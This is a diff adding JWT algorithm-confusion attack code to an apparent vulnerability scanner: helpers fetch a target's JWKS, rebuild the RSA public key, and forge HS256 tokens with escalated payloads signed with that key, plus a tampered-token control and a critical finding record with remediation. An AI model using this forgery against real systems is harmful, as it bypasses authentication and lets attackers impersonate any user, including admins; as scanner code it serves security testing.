@@ -135,6 +135,114 @@ def escalate_payload(payload: dict) -> dict:
     return out
 
 
+# Asymmetric algorithms whose verifier can be tricked into HMAC-with-public-key (algorithm confusion).
+_ASYM_ALGS = {"rs256", "rs384", "rs512", "es256", "es384", "es512", "ps256", "ps384", "ps512"}
+
+
+def jwks_candidate_urls(target_url: str) -> list:
+    """The well-known JWKS locations for the target's origin (public keys live here)."""
+    try:
+        p = urlparse(target_url)
+        origin = "%s://%s" % (p.scheme, p.netloc)
+    except Exception:
+        return []
+    return [origin + s for s in ("/.well-known/jwks.json", "/jwks.json", "/jwks", "/.well-known/openid-configuration/jwks")]
+
+
+def _rsa_pem_from_numbers(n_b64: str, e_b64: str) -> str:
+    """Rebuild the RSA public-key SPKI PEM from a JWK's base64url modulus/exponent."""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        n = int.from_bytes(b64url_decode(n_b64), "big")
+        e = int.from_bytes(b64url_decode(e_b64), "big")
+        pub = rsa.RSAPublicNumbers(e, n).public_key()
+        return pub.public_bytes(serialization.Encoding.PEM,
+                                serialization.PublicFormat.SubjectPublicKeyInfo).decode()
+    except Exception:
+        return ""
+
+
+def first_rsa_pem(jwks_body: str) -> str:
+    """Extract the first RSA public key from a JWKS (or a bare JWK) document as an SPKI PEM. '' if none."""
+    try:
+        doc = json.loads(jwks_body or "")
+    except Exception:
+        return ""
+    keys = doc.get("keys") if isinstance(doc, dict) else None
+    if keys is None and isinstance(doc, dict):
+        keys = [doc]                                  # a bare single JWK
+    for k in (keys or []):
+        if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
+            pem = _rsa_pem_from_numbers(k["n"], k["e"])
+            if pem:
+                return pem
+    return ""
+
+
+def x5c_to_pem(x5c_b64: str) -> str:
+    """The public-key PEM from an x5c certificate carried in a JWT header (a second key source)."""
+    try:
+        from cryptography.hazmat.primitives import serialization
+        from cryptography.x509 import load_der_x509_certificate
+        cert = load_der_x509_certificate(base64.b64decode(x5c_b64))
+        return cert.public_key().public_bytes(
+            serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo).decode()
+    except Exception:
+        return ""
+
+
+def pubkey_secret_variants(pem: str) -> list:
+    """The exact byte forms of the public key a naive verifier is likely to hand to HMAC. Bounded and
+    DETERMINISTIC (this is NOT a brute force over secrets) — the SPKI PEM with and without the trailing
+    newline are the two forms crypto libraries store; algorithm confusion succeeds with whichever exact
+    string the server passes to verify()."""
+    if not pem:
+        return []
+    with_nl = pem if pem.endswith("\n") else pem + "\n"
+    return list(dict.fromkeys([with_nl, with_nl.rstrip("\n")]))
+
+
+def forge_key_confusion(payload: dict, pubkey_secret: str) -> str:
+    """Forge an HS256 token whose HMAC secret is the RSA PUBLIC KEY PEM — the algorithm-confusion forgery."""
+    return forge_hs({"typ": "JWT"}, payload, pubkey_secret, "HS256")
+
+
+def tamper_signature(token: str) -> str:
+    """The original token with a mangled signature — a control that a sound verifier MUST reject, so an
+    'accept' on the forged token is only meaningful when this is rejected (kills accept-anything FPs)."""
+    parts = (token or "").split(".")
+    if len(parts) < 3 or not parts[2]:
+        return (token or "") + "x"
+    sig = parts[2]
+    flip = "A" if sig[-1] != "A" else "B"
+    return ".".join([parts[0], parts[1], sig[:-1] + flip])
+
+
+def key_confusion_finding(url: str, oracle: str) -> dict:
+    return {
+        "title": "JWT algorithm confusion (RS→HS): forged token accepted",
+        "severity": "critical", "family": "jwt", "confidence": "confirmed", "target": url,
+        "cwe": "CWE-347", "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N", "cvss_score": 9.1,
+        "description": ("The server accepted an HS256 token signed with its OWN RSA public key as the HMAC "
+                        "secret. Its verifier picks the algorithm from the attacker-controlled header, so a "
+                        "public value (the signing key) becomes a forgery secret — tokens can be minted for "
+                        "any user without the private key."),
+        "evidence": ("An HS256 token HMAC-signed with the server's published RSA public key authenticated at "
+                     "%s while a signature-tampered token was rejected. %s" % (url, oracle)),
+        "success_oracle": ("the HS256-with-public-key forged token authenticated where a tampered token did "
+                           "not — the verifier treats the RSA public key as a symmetric secret"),
+        "reproduction_steps": [
+            "Fetch the RSA public key (JWKS at /.well-known/jwks.json, or the token's x5c header).",
+            "Forge a token: header {alg:HS256}, escalated payload, HMAC-signed using the public-key PEM as the secret.",
+            "Send it to %s; it authenticates where a signature-tampered token is rejected." % url],
+        "impact": "Full authentication bypass and privilege escalation — forge a valid token for any user, including admin.",
+        "remediation": ("Pin the expected algorithm server-side (accept only RS*/ES* for an asymmetric key); never let "
+                        "the verifier choose the algorithm from the token header, and keep symmetric/asymmetric keys separate."),
+        "tags": ["jwt", "auth", "algorithm-confusion", "cwe-347"],
+    }
+
+
 def analyze(token: str, extra_secrets: list = None) -> dict:
     """Full offline analysis. Returns {decoded, findings, cracked_secret,
     forged_none, forged_admin}."""
